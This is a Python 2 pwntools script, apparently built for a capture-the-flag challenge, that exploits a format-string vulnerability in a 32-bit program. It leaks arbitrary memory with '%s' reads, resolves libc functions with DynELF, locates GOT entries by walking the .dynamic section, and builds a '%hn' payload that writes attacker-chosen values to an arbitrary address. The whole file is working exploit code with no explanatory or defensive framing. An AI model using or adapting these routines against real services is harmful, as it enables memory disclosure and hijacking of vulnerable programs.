#!/usr/bin/python
from pwn import *
import binascii
import sys

saveSocket = None

def leak(s,address):
  data = "%8$pBBBB" + pack(address)
  if "\n" in data:
    print " [!] newline in payload!"
    return ""
  try:
    s.sendline("%8$sAAAA" + pack(address))
  except EOFError:
    raise EOFError
  try:
    data = s.recv()
    print "[R] leaked %d bytes at %x " % (len(data.split("AAAA")[0]),address)
  except EOFError:
    print "[X] EOFError trying to leak from %x" % address
     
    return None
  (code,junk) = data.split("AAAA")
  return code

def leak_code(s,address,size):
  remainingSize = size
  out = bytearray("")
  while remainingSize > 0:
    try:
      data = leak(s,address + size - remainingSize)
    except EOFError:
      return out
    if data == None:
      remainingSize -= 1
    else:
      out += bytearray(data)
      remainingSize -= len(data) + 1
    out += bytearray("\x00")
  return out

def leakFour(address):
  global saveSocket
  print "[+] Called with addr %x" % address
  try:
    data = leak_code(saveSocket,address,4)[0:4]
    print binascii.hexlify(data)
    return str(data)
  except:
    return ''


def leak_libc_ptr(s,addr):
  global saveSocket
  saveSocket = s
  d = DynELF(leakFour,addr)
  dynamic_ptr = d.dynamic
  print "[+] .dynamic section :"+str(hex(dynamic_ptr))
  return d , dynamic_ptr

def leak_libc(d, func):
   libc_addr = d.lookup(func,'libc')
   print "[+] %s addr : %x" %(func,libc_addr)
   return libc_addr

def find_got(s,dynamic_ptr):
    addr = dynamic_ptr
    while True:
        x = leak(s,addr)
        if x == '\x03': # type PLTGOT
            addr += 4
            got_addr = unpack(leakFour(addr))
            print 'GOT Address: %s' % hex(got_addr)
            return got_addr
        addr += 8


def resolve_got(addr,func_libc):
    func_libc = hex(func_libc)
    while True :
        ret = leakFour(addr)
        ret = hex(unpack(ret))
        if ret[-3:] == func_libc[-3:] and  ret[2:4] == func_libc[2:4] :
            print " %s@got.plt : %s " % (addr, ret)
            return addr
        addr += 4


def send_payload(s,dest,data,offset):
   data_off_l = data & 0xFFFF
   data_off_u = (data >> 16) & 0xFFFF
   num1 = data_off_l - 8
   num2 =  data_off_u - data_off_l
   print "[+] Data_high = %x , Data_low = %x " %(data_off_u, data_off_l)
   payload = pack(dest)+pack(dest+2)+"%"+str(num1)+"u"+"%"+str(offset)+"$hn"+"%"+str(num2)+"u"+"%"+str(offset+1)+"$hn"
   print "[+] payload = "+repr(payload)
   s.sendline(payload)






